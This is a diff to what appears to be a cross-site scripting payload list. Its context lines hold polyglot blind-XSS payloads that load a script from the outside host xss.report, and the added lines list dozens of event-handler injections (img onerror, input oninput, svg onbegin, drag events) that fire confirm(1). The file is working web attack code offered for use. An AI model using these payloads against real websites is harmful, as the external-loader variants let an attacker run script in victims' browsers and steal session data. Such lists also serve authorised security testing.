@@ -87,3 +87,47 @@ javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembe
 /*iframe/src*/<iframe/src="<iframe/src=@"/onload=document.body.appendChild(document.createElement('script')).src='https://xss.report/c/rix4uni' /*iframe/src*/>
 1')"AutoFocus/ContentEditable/OnFocusIn=(document.body.appendChild(document.createElement('script')).src='https://xss.report/c/rix4uni')//
 ">><marquee><img src=x onerror=document.body.appendChild(document.createElement('script')).src='https://xss.report/c/rix4uni'></marquee> ></plaintext\></|\><plaintext/onmouseover=document.body.appendChild(document.createElement('script')).src='https://xss.report/c/rix4uni'>
+<img src=x onerror=confirm(1)>
+<img src=x onclick=confirm(1)>
+<img src=x ondblclick=confirm(1)>
+<img src=x onmousedown=confirm(1)>
+<img src=x onmouseenter=confirm(1)>
+<img src=x onmouseleave=confirm(1)>
+<img src=x onmousemove=confirm(1)>
+<img src=x onmouseout=confirm(1)>
+<img src=x onmouseover=confirm(1)>
+<img src=x onmouseup=confirm(1)>
+<img src=x onmousewheel=confirm(1)>
+<img src=x onpointerdown=confirm(1)>
+<img src=x onpointerenter=confirm(1)>
+<img src=x onpointerleave=confirm(1)>
+<img src=x onpointermove=confirm(1)>
+<img src=x onpointerout=confirm(1)>
+<img src=x onpointerover=confirm(1)>
+<img src=x onpointerrawupdate=confirm(1)>
+<img src=x onpointerup=confirm(1)>
+<form onsubmit=confirm(1)>
+<input onchange=confirm(1)>
+<video onplay=confirm(1)>
+<dialog ontoggle=confirm(1)>
+<body onresize=confirm(1)>
+<img src=x onwheel=confirm(1)>
+<style>img{animation:a 2s;}@keyframes a{from{}to{}}</style><img src=x onanimationstart=confirm(1)>
+<input onbeforeinput=confirm(1)>
+<input onchange=confirm(1)>
+<textarea onbeforeinput=confirm(1)>
+<div contenteditable onbeforeinput=confirm(1)>
+<input onchange=confirm(1)>
+<input oninput=confirm(1)>
+<input onbeforeinput=confirm(1)>
+<input onkeydown=confirm(1)>
+<input onkeyup=confirm(1)>
+<input onkeypress=confirm(1)>
+<input onfocus=confirm(1)>
+<input onblur=confirm(1)>
+<form onsubmit=confirm(1)>
+<form onformdata=confirm(1)>
+<details ontoggle=confirm(1)>
+<svg><animate attributeName="x" dur="1s" begin="0s" onbegin="confirm(1)" onend="confirm(1)"/></svg>
+<div contenteditableonbeforeinput=confirm(1)oninput=confirm(1)oncopy=confirm(1)onpaste=confirm(1)></div>
+<div draggable="true" ondragstart=confirm(1) ondrag=confirm(1) ondragend=confirm(1)>
